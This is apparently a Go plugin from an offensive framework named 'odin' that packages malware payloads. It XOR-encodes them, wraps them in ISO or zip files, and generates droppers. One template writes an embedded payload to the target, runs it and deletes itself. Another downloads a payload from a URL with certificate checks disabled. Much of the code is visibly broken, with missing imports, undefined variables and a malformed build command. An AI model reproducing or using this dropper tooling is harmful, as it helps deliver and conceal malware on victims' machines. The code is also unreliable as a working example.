package main

import(
  "os"
  "fmt"
  "bytes"
  "errors"
  "os/exec"
  "archive/zip"
	"text/template"

  "encoding/hex"
  "odin/plugins"
  "odin/lib/utils"
)
type Spikes struct{}

func PrintHelp(){
  fmt.Println("*************************************************************************************")
  fmt.Println(" ****  PONCUPINE PLUGIN  ")
  fmt.Println("*************************************************************************************")
  fmt.Println(" It honestly don't do much other than spike things differently........")
  fmt.Println("Generate an iso froom a given payload")
  fmt.Println("Create a dropper, Self downloading or URL Downloader")
  fmt.Println("Encoder a given payload. Supports only xor encoding for now.")
  fmt.Println("LNK and macro builders to be added soon")
}

func (sp *Spikes) Porcupine(inputFile,outputFile,format string) *plugins.Spike{
  var (
    err  error
    spike *plugins.Spike
  )
  fmt.Println("I have been loaded............")
  switch format{
    case "iso":
      err = IsoGenerator(inputFile,outputFile)
      if err != nil{
        spike.Err = errors.New("Internal Iso Generator  error.\n")
        utils.Logerror(err)
        return spike
      }
    case "zip":
      if err := Zipper(inputFile,outputFile); err != nil{
        spike.Err = errors.New("Internal zippper error.\n")
        utils.Logerror(err)
        return spike
      }
    case "dropper":
      if err := CreateDroper(inputFile,outputFile); err != nil{
        spike.Err = errors.New("Internal dropper error.\n")
        utils.Logerror(err)
        return spike
      }//zip
    case "enc": //sc,zip
      var tech string
      fmt.Sprintf("[PORCUPINE]: Enter encoding technique: ")
      fmt.Scanln(&tech)
      if err := Encoder(inputFile,outputFile,tech); err != nil {
        spike.Err = errors.New("Internal Encoding error.\n")
        utils.Logerror(err)
        return spike
      }
    default:
      PrintHelp()
  }
  return spike
}
//load-poncupine --iF ../bin/temp/test.exe --oF ../bin/templ/text_modified.exe
func NewDropper()plugins.Rodent{
  return new(Spikes)
}

var Encoder = func(inputFile,outputFile,tech string)error{
  input,err := os.ReadFile(inputFile)
  if err != nil {
    return fmt.Errorf("Error reading from input file %q. %v",inputFile,err)
  }
  if tech == "xor"{
    key := byte(0x3F)
    for i := 0; i < len(input); i++{
      input[i] ^= key
    }
    err = os.WriteFile(outputFile,input,0644)
    if err != nil { return fmt.Errorf("Error writing to encoded file. %v",err) }
    return nil
  }
  return nil
}

var CreateDroper = func(inputFile,outputFile string)error{
  var sw string
  input,err := os.ReadFile(inputFile)
  if err != nil{ return err}
  fmt.Sprintf("Self downloader or url download. (Enter YES/NO) \n[PORCUPINE]: ")
  fmt.Scanln(&sw)
  if sw == "YES"|| sw == "Y"{
    data := hex.EncodeToString(input)
    var name,ops,arch string
    fmt.Sprintf("Enter name of file on target. File that will be created at the target (payload.exe) \n[PORCUPINE]: ")
    fmt.Scanln(&name)
    fmt.Sprintf("Enter target operating system. (windows/linux).\n[PORCUPINE]: ")
    fmt.Scanln(&ops)
    fmt.Sprintf("Enter architecture of target operating system.\n[PORCUPINE]: ")
    fmt.Scanln(&arch)
    tmpl, err := template.New("source").Parse(SelfWriter)
	   if err != nil {
       return fmt.Errorf("Error parsing template: %v", err)
	   }
     tempFile, err := createTempFile(tmpl,struct{Data,Name string}{data,name})
	   if err != nil {
		   return fmt.Errorf("Error creating temporary file: %v", err)
   	 }
     defer os.Remove(tempFile.Name())
     bin, err := exec.Command("GOOS=" + ops + " " +"GOARCH=" + arch + " go ", "build", "-o", outputFile, tempFile.Name()).CombinedOutput()
     if err != nil {
       return fmt.Errorf("Error executing builde droper. %v",err)
     }
     if bytes.Contains(bin, []byte("error")) {
       return fmt.Errorf("Build failed: %s", string(bin))
     }
  }
  return nil
}
var SelfWriter = `package main
import(
  "os"
  "fmt"
  "encoding/hex"
)
func init(){
  data := {{.Data}}
  name := {{.Name}}
  dcd,err := hex.DecodeString(data)
  if err != nil{
    fmt.Println(err);return
  }
  err := os.WriteFile(name,dcd,0755)
  if err !=nil {fmt.Println(err)}
  switch runtime.GOOS {
  case "windows":
    _,err = exec.Command(".\"+name).CombinedOutput()
    if err != nil{
      fmt.Println(err);return
    }
  case "linux":
    _,err = exec.Command("./"+name).CombinedOutput()
    if err != nil{
      fmt.Println(err);return
    }
  default:
  }
}
func main()  {
  _ = os.Remove(os.Args[0])
  os.Exit()
}
`

var Downloader = `package main
import(
  "fmt"
  "bytes"
  "net/http"
)
func main(){
  dwldUrl = {{.DownloadUrl}}
  var client = new(http.Client)
  if strings.Contains(dwldUrl,"https") {
		client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
	} else {
		client = &http.Client{}
	}
  req,err := http.NewRequiest("GET",dwldUrl)
  if err != nil{
    panic(err)
  }
  body,err := client.Do(req)
  if err != nil{ panic(err) }
  defer body.Body.Close()
  buf := bytes.NewBuffer([]byte{})
	_, err = io.Copy(buf, resp.Body)
	if err != nil {
		panic(err)
	}
  sc := buf.Bytes()
  //write it to file
  err := os.WriteFile(name,sc,0755)
  if err !=nil {fmt.Println(err)}
}`


// can only be callled by the main after payload has been generated.
var IsoGenerator = func(inputFile,outputFile string) error {
  utils.Warning("This command needs proper instalation of genisoimage. (Works well on linux.\nNot sure on windows.....Sorryyyyy :)")
  buildCmd := `genisoimage -o  ` + outputFile + ` -r  ` + inputFile
  var cmd *exec.Cmd
  currOs := utils.GetCurrentOS()
  if currOs  == "windows"{
    cmd = exec.Command("cmd","/c",buildCmd)
  } else {
    cmd = exec.Command("sh","-c",buildCmd)
  }
  cmd.Stdout = os.Stdout
  cmd.Stderr = os.Stderr
  return cmd.Run()
}

var Zipper = func(inputFile,outputFile string) error {
  buf := new(bytes.Buffer)
  w := zip.NewWriter(buf)
  input,err := os.ReadFile(inputFile)
  if err != nil {
    return fmt.Errorf("Error reading from input file %q. %v",inputFile,err)
  }
  f,err := w.Create(outputFile)
  if err != nil{
    return fmt.Errorf("Error creating output file %q. %v",outputFile,err)
  }
  _,err = f.Write(input)
  if err != nil{
    return fmt.Errorf("Error writing to output file. %v")
  }
  return nil
}

func createTempFile(tmpl *template.Template, def interface{}) (*os.File, error) {
	file, err := os.Create("temp.go")
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, def); err != nil {
		return nil, err
	}
	_, err = file.Write(buf.Bytes())
	if err != nil {
		return nil, err
	}
	return file, file.Close()
}

func XOR(buf []byte,xorchar byte)[]byte{
  res := make([]byte,len(buf))
  for i := 0; i < len(buf); i++ {
    res[i] =  xorchar ^ buf[i]
  }
  return res
}
